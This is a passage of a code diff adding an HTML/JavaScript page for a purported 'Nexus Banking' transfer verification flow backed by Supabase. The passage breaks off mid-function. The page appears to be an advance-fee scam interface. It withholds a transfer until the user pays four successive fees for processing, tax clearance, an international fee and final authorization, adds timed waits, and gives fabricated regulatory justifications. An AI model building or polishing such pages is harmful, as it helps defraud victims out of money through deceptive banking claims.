@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Banking - Transfer Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0f;
+            color: white;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        .font-display { font-family: 'Space Grotesk', sans-serif; }
+        
+        .gradient-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #16213e 100%);
+            z-index: -3;
+        }
+        
+        .floating-shapes {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -2; overflow: hidden; pointer-events: none;
+        }
+        
+        .shape {
+            position: absolute; opacity: 0.1;
+            animation: float3d 20s infinite ease-in-out;
+        }
+        
+        .shape-1 {
+            width: 400px; height: 400px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            top: 5%; left: 5%; filter: blur(2px);
+        }
+        
+        .shape-2 {
+            width: 300px; height: 300px;
+            background: linear-gradient(135deg, #8b5cf6, #3b82f6);
+            border-radius: 70% 30% 30% 70% / 70% 70% 30% 30%;
+            bottom: 10%; right: 5%; filter: blur(3px);
+        }
+        
+        @keyframes float3d {
+            0%, 100% { transform: translate(0, 0) rotate(0deg) scale(1); }
+            50% { transform: translate(30px, -30px) rotate(180deg) scale(1.1); }
+        }
+        
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        
+        .code-input-group {
+            display: flex;
+            gap: 0.5rem;
+            justify-content: center;
+            margin: 1.5rem 0;
+        }
+        
+        .code-segment {
+            width: 70px;
+            height: 55px;
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 700;
+            font-family: 'Space Grotesk', monospace;
+            letter-spacing: 2px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: white;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+        
+        .code-segment:focus {
+            border-color: #6366f1;
+            background: rgba(99, 102, 241, 0.1);
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
+            outline: none;
+        }
+        
+        .code-segment.filled {
+            border-color: #10b981;
+            background: rgba(16, 185, 129, 0.1);
+        }
+        
+        .code-segment.error {
+            border-color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+            animation: shake 0.5s ease;
+        }
+        
+        .code-dash {
+            display: flex;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 700;
+            font-size: 1.2rem;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        .paid-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.4rem 1rem;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 20px;
+            color: #10b981;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        
+        .not-paid-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.4rem 1rem;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 20px;
+            color: #ef4444;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        
+        .btn-primary {
+            width: 100%; padding: 1rem;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border: none; border-radius: 12px; color: white;
+            font-weight: 600; font-size: 1rem; cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5; cursor: not-allowed; transform: none;
+        }
+        
+        .btn-secondary {
+            padding: 0.75rem 1.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px; color: white;
+            font-weight: 500; cursor: pointer;
+            transition: all 0.3s ease; display: inline-flex;
+            align-items: center; gap: 0.5rem;
+            text-decoration: none;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .success-icon {
+            width: 80px; height: 80px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 1.5rem;
+            animation: scaleIn 0.5s ease;
+        }
+        
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        
+        .receipt-row {
+            display: flex; justify-content: space-between;
+            padding: 0.875rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .receipt-row:last-child { border-bottom: none; }
+        
+        .receipt-label { color: rgba(255, 255, 255, 0.5); font-size: 0.9rem; }
+        .receipt-value { font-weight: 600; text-align: right; }
+        
+        #toast {
+            position: fixed; bottom: 2rem; right: 2rem;
+            transform: translateY(20px); opacity: 0;
+            transition: all 0.3s ease; z-index: 1001;
+        }
+        
+        #toast.show { transform: translateY(0); opacity: 1; }
+
+        /* ============================================
+           REUSABLE NEXUS LOADER (from index.html)
+           ============================================ */
+        .nexus-loader-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.4s ease, visibility 0.4s;
+        }
+        
+        .nexus-loader-overlay.show {
+            display: flex;
+        }
+        
+        .nexus-loader-overlay.fade-out {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        
+        .nexus-logo-container {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin-bottom: 2rem;
+            transform-style: preserve-3d;
+        }
+        
+        .nexus-logo-ring {
+            position: absolute;
+            border: 3px solid transparent;
+            border-radius: 50%;
+            animation: rotate3d 4s linear infinite;
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+        }
+        
+        .nexus-logo-ring:nth-child(1) {
+            width: 100%; height: 100%;
+            border-top-color: #6366f1;
+            border-right-color: #6366f1;
+            animation-duration: 4s;
+        }
+        
+        .nexus-logo-ring:nth-child(2) {
+            width: 75%; height: 75%;
+            top: 12.5%; left: 12.5%;
+            border-bottom-color: #8b5cf6;
+            border-left-color: #8b5cf6;
+            animation-duration: 3s;
+            animation-direction: reverse;
+        }
+        
+        .nexus-logo-ring:nth-child(3) {
+            width: 50%; height: 50%;
+            top: 25%; left: 25%;
+            border-top-color: #3b82f6;
+            border-bottom-color: #3b82f6;
+            animation-duration: 2s;
+        }
+        
+        .nexus-logo-center {
+            position: absolute;
+            width: 35%; height: 35%;
+            top: 32.5%; left: 32.5%;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse3d 2s ease-in-out infinite;
+            box-shadow: 
+                0 0 30px rgba(99, 102, 241, 0.6),
+                0 0 60px rgba(99, 102, 241, 0.3),
+                inset 0 0 20px rgba(255, 255, 255, 0.2);
+        }
+        
+        @keyframes rotate3d {
+            from { transform: rotateY(0deg) rotateX(10deg); }
+            to { transform: rotateY(360deg) rotateX(10deg); }
+        }
+        
+        @keyframes pulse3d {
+            0%, 100% { 
+                transform: scale(1) translateZ(20px); 
+                box-shadow: 0 0 30px rgba(99, 102, 241, 0.6), 0 0 60px rgba(99, 102, 241, 0.3);
+            }
+            50% { 
+                transform: scale(1.1) translateZ(40px); 
+                box-shadow: 0 0 50px rgba(99, 102, 241, 0.8), 0 0 100px rgba(99, 102, 241, 0.5);
+            }
+        }
+        
+        .nexus-loader-text {
+            text-align: center;
+            animation: fadeInUp 0.6s ease;
+        }
+        
+        .nexus-loader-title {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff 0%, #6366f1 50%, #8b5cf6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.02em;
+            text-shadow: 0 0 30px rgba(99, 102, 241, 0.5);
+            font-family: 'Space Grotesk', sans-serif;
+        }
+        
+        .nexus-loader-subtitle {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1rem;
+            margin-top: 0.5rem;
+        }
+        
+        .nexus-loader-dots {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 4px;
+        }
+        
+        .nexus-loader-dots span {
+            animation: dotPulse 1.4s ease-in-out infinite both;
+        }
+        
+        .nexus-loader-dots span:nth-child(1) { animation-delay: 0s; }
+        .nexus-loader-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .nexus-loader-dots span:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes dotPulse {
+            0%, 80%, 100% { opacity: 0; transform: scale(0); }
+            40% { opacity: 1; transform: scale(1); }
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Timer Styles */
+        .timer-container {
+            text-align: center;
+            padding: 2rem;
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .timer-circle {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 1.5rem;
+            position: relative;
+        }
+
+        .timer-circle svg {
+            transform: rotate(-90deg);
+            width: 100%;
+            height: 100%;
+        }
+
+        .timer-circle-bg {
+            fill: none;
+            stroke: rgba(255,255,255,0.05);
+            stroke-width: 8;
+        }
+
+        .timer-circle-progress {
+            fill: none;
+            stroke: url(#timerGradient);
+            stroke-width: 8;
+            stroke-linecap: round;
+            transition: stroke-dashoffset 1s linear;
+        }
+
+        .timer-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Space Grotesk', monospace;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #f59e0b;
+        }
+
+        .timer-label {
+            color: rgba(255,255,255,0.5);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .timer-next-code {
+            color: #6366f1;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .code-section {
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .code-section.hidden {
+            display: none;
+        }
+
+        .billing-info-card {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(139, 92, 246, 0.05));
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            border-radius: 16px;
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .billing-amount {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #fbbf24;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .billing-name {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 0.5rem;
+        }
+
+        .billing-description {
+            color: rgba(255,255,255,0.6);
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .code-explanation {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 3px solid #6366f1;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 12px 12px 0;
+            font-size: 0.85rem;
+            color: rgba(255,255,255,0.7);
+            line-height: 1.7;
+        }
+
+        .code-explanation strong {
+            color: #a5b4fc;
+        }
+
+        .code-hint {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-family: 'Space Grotesk', monospace;
+            font-size: 0.9rem;
+            color: #6366f1;
+            margin: 0.5rem 0;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 0.75rem;
+            padding-top: 0.75rem;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .slide-in {
+            animation: slideInRight 0.5s ease;
+        }
+
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @media (max-width: 640px) {
+            .code-segment { width: 55px; height: 48px; font-size: 0.9rem; }
+            .timer-circle { width: 120px; height: 120px; }
+            .timer-text { font-size: 1.4rem; }
+            .nexus-logo-container { width: 100px; height: 100px; }
+            .nexus-loader-title { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+    <!-- SVG Gradient for Timer -->
+    <svg width="0" height="0" style="position:absolute;">
+        <defs>
+            <linearGradient id="timerGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" style="stop-color:#6366f1;stop-opacity:1" />
+                <stop offset="100%" style="stop-color:#8b5cf6;stop-opacity:1" />
+            </linearGradient>
+        </defs>
+    </svg>
+
+    <!-- Background -->
+    <div class="gradient-bg"></div>
+    <div class="floating-shapes">
+        <div class="shape shape-1"></div>
+        <div class="shape shape-2"></div>
+    </div>
+
+    <!-- ============================================
+         REUSABLE NEXUS LOADER
+         ============================================ -->
+    <div class="nexus-loader-overlay" id="nexusLoader">
+        <div class="nexus-logo-container">
+            <div class="nexus-logo-ring"></div>
+            <div class="nexus-logo-ring"></div>
+            <div class="nexus-logo-ring"></div>
+            <div class="nexus-logo-center">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+                </svg>
+            </div>
+        </div>
+        <div class="nexus-loader-text">
+            <h1 class="nexus-loader-title font-display">NEXUS</h1>
+            <p class="nexus-loader-subtitle" id="loaderSubtitle">Processing<span class="nexus-loader-dots"><span>.</span><span>.</span><span>.</span></span></p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-lg">
+            
+            <!-- Header -->
+            <div class="text-center mb-8 slide-in">
+                <div class="flex items-center justify-center gap-3 mb-4">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center">
+                        <i class="fas fa-cube text-white"></i>
+                    </div>
+                    <span class="text-xl font-bold font-display">NEXUS</span>
+                </div>
+                <h1 class="text-2xl font-bold font-display">Transfer Verification</h1>
+                <p class="text-gray-400 mt-1">Complete all billing stages to finalize your transfer</p>
+            </div>
+
+            <!-- Pending Transfer Info -->
+            <div class="glass-card p-5 mb-6 slide-in" id="pendingInfoCard" style="animation-delay: 0.1s;">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="pending-badge">
+                        <i class="fas fa-clock"></i> Pending Transfer
+                    </div>
+                </div>
+                <div class="grid grid-cols-2 gap-4 text-sm">
+                    <div>
+                        <p class="text-gray-500">Total Amount</p>
+                        <p class="font-semibold text-yellow-400 text-lg" id="verifyAmount">$0.00</p>
+                    </div>
+                    <div>
+                        <p class="text-gray-500">Recipient</p>
+                        <p class="font-semibold" id="verifyRecipient">-</p>
+                    </div>
+                    <div>
+                        <p class="text-gray-500">Bank</p>
+                        <p class="font-semibold" id="verifyBank">-</p>
+                    </div>
+                    <div>
+                        <p class="text-gray-500">Transaction ID</p>
+                        <p class="font-semibold text-indigo-400" id="verifyTxnId">-</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- No Pending Transfer Message -->
+            <div class="glass-card p-8 text-center hidden" id="noPendingMessage">
+                <i class="fas fa-check-circle text-5xl text-green-400 mb-4"></i>
+                <h2 class="text-xl font-bold mb-2">No Pending Transfers</h2>
+                <p class="text-gray-400 mb-6">You don't have any transfers awaiting verification.</p>
+                <a href="dashboard.html" class="btn-secondary">
+                    <i class="fas fa-home"></i> Go to Dashboard
+                </a>
+            </div>
+
+            <!-- Timer Display -->
+            <div class="glass-card hidden mb-6" id="timerDisplay">
+                <div class="timer-container">
+                    <div class="timer-circle">
+                        <svg viewBox="0 0 150 150">
+                            <circle class="timer-circle-bg" cx="75" cy="75" r="65"></circle>
+                            <circle class="timer-circle-progress" id="timerCircle" cx="75" cy="75" r="65" 
+                                stroke-dasharray="408.4" stroke-dashoffset="0"></circle>
+                        </svg>
+                        <div class="timer-text" id="timerText">30:00</div>
+                    </div>
+                    <div class="timer-label">Next billing code unlocks in</div>
+                    <div class="timer-next-code" id="timerNextCode">Second Billing Code</div>
+                    <p class="text-gray-400 text-sm mt-3 max-w-xs mx-auto" id="timerMessage">
+                        Please wait while we process your previous verification...
+                    </p>
+                </div>
+            </div>
+
+            <!-- Verification Form -->
+            <div class="glass-card p-6" id="verificationForm">
+
+                <!-- Code 1: Processing Fee -->
+                <div class="code-section mb-6" id="codeSection1">
+                    <div class="billing-info-card" id="billingInfo1">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="billing-name" id="billingName1">
+                                <i class="fas fa-circle-notch fa-spin text-indigo-400 mr-2"></i>Loading...
+                            </span>
+                            <span class="billing-amount" id="billingAmount1">--</span>
+                        </div>
+                        <p class="billing-description" id="billingDesc1">Fetching billing details...</p>
+                        
+                        <div class="code-explanation" id="explanation1">
+                            <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
+                            This initial processing fee covers the administrative costs of verifying your identity, 
+                            validating the recipient's banking details, and initiating the secure transfer protocol. 
+                            This fee ensures your transaction is routed through our encrypted banking network and 
+                            complies with international financial regulations. Without this step, your transfer cannot 
+                            proceed to the next stage.
+                        </div>
+                        
+                        <div class="code-hint" id="codeHint1">
+                            <i class="fas fa-key"></i> Your code starts with: <strong id="hintText1">****</strong>
+                        </div>
+                        
+                        <div class="status-indicator">
+                            <span id="billingStatus1" class="not-paid-badge">
+                                <i class="fas fa-times-circle"></i> Not Paid
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="code-input-group">
+                        <input type="text" class="code-segment" maxlength="4" data-code="1" data-segment="0" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="1" data-segment="1" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="1" data-segment="2" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="1" data-segment="3" placeholder="XXXX">
+                    </div>
+                    <button class="btn-primary" onclick="verifyCode(1)" id="verifyBtn1">
+                        <i class="fas fa-check mr-2"></i> Verify First Code
+                    </button>
+                </div>
+
+                <!-- Code 2: Tax Clearance -->
+                <div class="code-section mb-6 hidden" id="codeSection2">
+                    <div class="billing-info-card" id="billingInfo2">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="billing-name" id="billingName2">
+                                <i class="fas fa-circle-notch fa-spin text-indigo-400 mr-2"></i>Loading...
+                            </span>
+                            <span class="billing-amount" id="billingAmount2">--</span>
+                        </div>
+                        <p class="billing-description" id="billingDesc2">Fetching billing details...</p>
+                        
+                        <div class="code-explanation" id="explanation2">
+                            <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
+                            International wire transfers exceeding regulatory thresholds require mandatory tax clearance 
+                            to comply with anti-money laundering (AML) laws and cross-border financial regulations. 
+                            This fee covers the cost of tax documentation, regulatory filing, and clearance certificates 
+                            needed to prevent your transfer from being flagged or held by intermediary banks. This step 
+                            protects both sender and recipient from legal complications.
+                        </div>
+                        
+                        <div class="code-hint" id="codeHint2">
+                            <i class="fas fa-key"></i> Your code starts with: <strong id="hintText2">****</strong>
+                        </div>
+                        
+                        <div class="status-indicator">
+                            <span id="billingStatus2" class="not-paid-badge">
+                                <i class="fas fa-times-circle"></i> Not Paid
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="code-input-group">
+                        <input type="text" class="code-segment" maxlength="4" data-code="2" data-segment="0" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="2" data-segment="1" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="2" data-segment="2" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="2" data-segment="3" placeholder="XXXX">
+                    </div>
+                    <button class="btn-primary" onclick="verifyCode(2)" id="verifyBtn2">
+                        <i class="fas fa-check mr-2"></i> Verify Second Code
+                    </button>
+                </div>
+
+                <!-- Code 3: International Transfer Fee -->
+                <div class="code-section mb-6 hidden" id="codeSection3">
+                    <div class="billing-info-card" id="billingInfo3">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="billing-name" id="billingName3">
+                                <i class="fas fa-circle-notch fa-spin text-indigo-400 mr-2"></i>Loading...
+                            </span>
+                            <span class="billing-amount" id="billingAmount3">--</span>
+                        </div>
+                        <p class="billing-description" id="billingDesc3">Fetching billing details...</p>
+                        
+                        <div class="code-explanation" id="explanation3">
+                            <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
+                            Cross-border transfers involve multiple intermediary banks, SWIFT network charges, 
+                            currency conversion costs, and international clearing fees. This fee ensures your funds 
+                            move seamlessly through the global banking network without delays. It covers wire transfer 
+                            processing, foreign exchange handling, and correspondent bank fees that are unavoidable 
+                            when sending money across international borders.
+                        </div>
+                        
+                        <div class="code-hint" id="codeHint3">
+                            <i class="fas fa-key"></i> Your code starts with: <strong id="hintText3">****</strong>
+                        </div>
+                        
+                        <div class="status-indicator">
+                            <span id="billingStatus3" class="not-paid-badge">
+                                <i class="fas fa-times-circle"></i> Not Paid
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="code-input-group">
+                        <input type="text" class="code-segment" maxlength="4" data-code="3" data-segment="0" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="3" data-segment="1" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="3" data-segment="2" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="3" data-segment="3" placeholder="XXXX">
+                    </div>
+                    <button class="btn-primary" onclick="verifyCode(3)" id="verifyBtn3">
+                        <i class="fas fa-check mr-2"></i> Verify Third Code
+                    </button>
+                </div>
+
+                <!-- Code 4: Final Authorization -->
+                <div class="code-section mb-6 hidden" id="codeSection4">
+                    <div class="billing-info-card" id="billingInfo4">
+                        <div class="flex items-center justify-between mb-2">
+                            <span class="billing-name" id="billingName4">
+                                <i class="fas fa-circle-notch fa-spin text-indigo-400 mr-2"></i>Loading...
+                            </span>
+                            <span class="billing-amount" id="billingAmount4">--</span>
+                        </div>
+                        <p class="billing-description" id="billingDesc4">Fetching billing details...</p>
+                        
+                        <div class="code-explanation" id="explanation4">
+                            <strong><i class="fas fa-info-circle mr-1"></i>Why this fee is required:</strong><br>
+                            This final authorization fee covers comprehensive security verification, compliance checks, 
+                            and the release of funds to the recipient's account. It includes multi-factor authentication 
+                            processing, final audit trail generation, and anti-fraud validation. This critical step 
+                            completes the transfer authentication and triggers the actual movement of funds, ensuring 
+                            your money reaches the intended recipient safely and with full legal protection.
+                        </div>
+                        
+                        <div class="code-hint" id="codeHint4">
+                            <i class="fas fa-key"></i> Your code starts with: <strong id="hintText4">****</strong>
+                        </div>
+                        
+                        <div class="status-indicator">
+                            <span id="billingStatus4" class="not-paid-badge">
+                                <i class="fas fa-times-circle"></i> Not Paid
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="code-input-group">
+                        <input type="text" class="code-segment" maxlength="4" data-code="4" data-segment="0" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="4" data-segment="1" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="4" data-segment="2" placeholder="XXXX">
+                        <span class="code-dash">-</span>
+                        <input type="text" class="code-segment" maxlength="4" data-code="4" data-segment="3" placeholder="XXXX">
+                    </div>
+                    <button class="btn-primary" onclick="verifyCode(4)" id="verifyBtn4">
+                        <i class="fas fa-check mr-2"></i> Verify Final Code & Complete
+                    </button>
+                </div>
+            </div>
+
+            <!-- All Verified Success -->
+            <div class="glass-card p-8 text-center hidden" id="allVerifiedMessage">
+                <div class="success-icon">
+                    <i class="fas fa-check-double text-3xl text-white"></i>
+                </div>
+                <h2 class="text-2xl font-bold text-green-400 mb-2">Transfer Completed!</h2>
+                <p class="text-gray-400 mb-6">All billing codes verified. Your transfer is now complete.</p>
+                
+                <div class="glass-card p-4 mb-6 text-left">
+                    <div class="receipt-row">
+                        <span class="receipt-label">Amount</span>
+                        <span class="receipt-value text-yellow-400" id="finalAmount">$0.00</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span class="receipt-label">Recipient</span>
+                        <span class="receipt-value" id="finalRecipient">-</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span class="receipt-label">Transaction ID</span>
+                        <span class="receipt-value text-indigo-400" id="finalTxnId">-</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span class="receipt-label">Status</span>
+                        <span class="receipt-value text-green-400">Completed</span>
+                    </div>
+                </div>
+                
+                <div class="flex gap-3 justify-center flex-wrap">
+                    <a href="dashboard.html" class="btn-secondary">
+                        <i class="fas fa-home"></i> Dashboard
+                    </a>
+                    <a href="dashboard.html" class="btn-secondary">
+                        <i class="fas fa-list"></i> Transactions
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div id="toast">
+        <div class="glass-card px-6 py-4 flex items-center gap-3">
+            <i class="fas fa-check-circle text-green-400 text-xl"></i>
+            <span id="toastMessage">Operation successful</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // SUPABASE CONFIG
+        // ============================================
+        const supabaseUrl = 'https://okgkawqvnygwkosoqbqb.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9rZ2thd3F2bnlnd2tvc29xYnFiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYyODA3MjgsImV4cCI6MjA5MTg1NjcyOH0.ctfeDvcXQ9OV8TvpsRKdgf7XLBxTHLouNfGn5_fHky8';
+        
+        let supabaseClient;
+        let currentUser = null;
+        let currentPendingTransfer = null;
+        let verifiedCodes = [false, false, false, false];
+        let timerInterval = null;
+        let userProfile = null;
+        
+        const billingConfig = {
+            1: { key: 'first', amountField: 'first_billing', name: 'Processing Fee', icon: 'fa-shield-alt' },
+            2: { key: 'second', amountField: 'second_billing', name: 'Tax Clearance', icon: 'fa-file-invoice-dollar' },
+            3: { key: 'third', amountField: 'third_billing', name: 'International Transfer Fee', icon: 'fa-globe' },
+            4: { key: 'fourth', amountField: 'fourth_billing', name: 'Final Authorization', icon: 'fa-lock' }
+        };
+
+        const codeNames = ["First", "Second", "Third", "Fourth"];
+        
+        try {
+            supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+        } catch (e) {
+            console.error('Supabase init error:', e);
+        }
+
+        // ============================================
+        // NEXUS LOADER FUNCTIONS
+        // ============================================
+        function showLoader(text = 'Processing') {
+            const loader = document.getElementById('nexusLoader');
+            const subtitle = document.getElementById('loaderSubtitle');
+            subtitle.innerHTML = text + '<span class="nexus-loader-dots"><span>.</span><span>.</span><span>.</span></span>';
+            loader.classList.add('show');
+            loader.classList.remove('fade-out');
+        }
+
+        function hideLoader() {
+            const loader = document.getElementById('nexusLoader');
+            loader.classList.add('fade-out');
+            setTimeout(() => {
+                loader.classList.remove('show');
+            }, 400);
+        }
+
+        // ============================================
+        // INIT
+        // ============================================
+        document.addEventListener('DOMContentLoaded', async () => {
+            showLoader('Verifying your session');
+            
+            if (!supabaseClient) {
+                hideLoader();
+                showToast('Supabase not initialized', 'error');
+                return;
+            }
+            
+            const { data: { session } } = await supabaseClient.auth.getSession();
+            if (!session) {
+                hideLoader();
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            currentUser = session.user;
+            
+            await loadUserProfile();
+            
+            loadPendingTransfer();
+            
+            if (!currentPendingTransfer) {
+                document.getElementById('pendingInfoCard').classList.add('hidden');
+                document.getElementById('verificationForm').classList.add('hidden');
+                document.getElementById('noPendingMessage').classList.remove('hidden');
+                hideLoader();
+                return;
+            }
+            
+            populatePendingInfo();
+            populateBillingInfoFromProfile();
+            showActiveCodeSection();
+            setupCodeInputs();
+            
+            hideLoader();
+        });
+
+        // ============================================
+        // LOAD USER PROFILE FROM SUPABASE
+        // ============================================
+        async function loadUserProfile() {
+            try {
